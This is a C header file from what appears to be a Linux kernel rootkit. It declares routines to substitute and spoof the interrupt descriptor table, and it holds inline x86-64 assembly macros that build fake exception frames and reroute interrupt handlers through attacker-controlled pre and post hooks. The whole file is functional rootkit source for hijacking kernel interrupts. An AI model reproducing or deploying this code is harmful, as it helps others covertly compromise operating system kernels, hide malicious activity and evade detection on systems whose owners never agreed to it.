#ifndef ROOTKIT_IDT_H
# define ROOTKIT_IDT_H

# include "regs.h"

void idt_init(void);
void idt_substitute_table(void);
void idt_restore_table(void);
int idt_spoofed(void);

void idt_restore(void);

void idt_set_entry(unsigned long addr, int n);
void idt_restore_entry(int n);

extern unsigned long idt_pre_hook[256];
extern unsigned long idt_post_hook[256];
extern unsigned long idt_orig_hook[256];

# define idt_create_hook(Entry)                                              \
    extern asmlinkage void idt_fake_iret_##Entry(void);                      \
    void ___idt_unused_##Entry(void) {                                       \
        asm volatile (                                                       \
            ".globl idt_fake_iret_"#Entry"\n"                                \
            ".align 8, 0x90\n"                                               \
            "idt_fake_iret_"#Entry":\n"                                      \
            "callq *(idt_post_hook + "#Entry" * 8)\n"                        \
            "iretq\n"                                                        \
        );                                                                   \
        asm volatile (                                                       \
            ".globl idt_fake_hdlr_"#Entry"\n"                                \
            ".align 8, 0x90\n"                                               \
            "idt_fake_hdlr_"#Entry":\n"                                      \
            "movq %rsp, %r8\n"                                               \
            "sub $0x28, %rsp\n"               /* fake cpu exception frame */ \
            "movq $0x18, 0x20(%rsp)\n"        /* SS                       */ \
            "movq %r8, 0x18(%rsp)\n"          /* RSP                      */ \
            "movq $0x0, 0x10(%rsp)\n"         /* EFLAGS                   */ \
            "movq $0x10, 0x8(%rsp)\n"         /* CS                       */ \
            "movq $idt_fake_iret_"#Entry      /* RIP                      */ \
                ", 0x0(%rsp)\n"                                              \
            SAVE_REGS2                                                       \
            "mov %rsp, %rdi\n"                /* struct pt_regs as arg    */ \
            "callq *(idt_pre_hook + "#Entry" * 8)\n"                         \
            RESTORE_REGS2                                                    \
            "jmp *(idt_orig_hdlr + "#Entry" * 8)\n"                          \
        );                                                                   \
    }                                                                        \
    extern asmlinkage void idt_fake_hdlr_##Entry(void)

# define idt_create_pre_hook(Entry)                                          \
    void ___idt_unused_##Entry(void) {                                       \
        asm volatile (                                                       \
            ".globl idt_fake_hdlr_"#Entry"\n"                                \
            ".align 8, 0x90\n"                                               \
            "idt_fake_hdlr_"#Entry":\n"                                      \
            SAVE_REGS2                                                       \
            "callq *(idt_pre_hook + "#Entry" * 8)\n"                         \
            RESTORE_REGS2                                                    \
            "jmp *(idt_orig_hdlr + "#Entry" * 8)\n"                          \
        );                                                                   \
    }                                                                        \
    extern asmlinkage void idt_fake_hdlr_##Entry(void)

void idt_hook_cfg(int n, unsigned long pre, unsigned long post);

# define idt_hook_enable(Entry) \
    idt_set_entry((unsigned long)idt_fake_hdlr_##Entry, Entry);

void idt_hook_disable(int entry);

#endif /* !ROOTKIT_IDT_H */
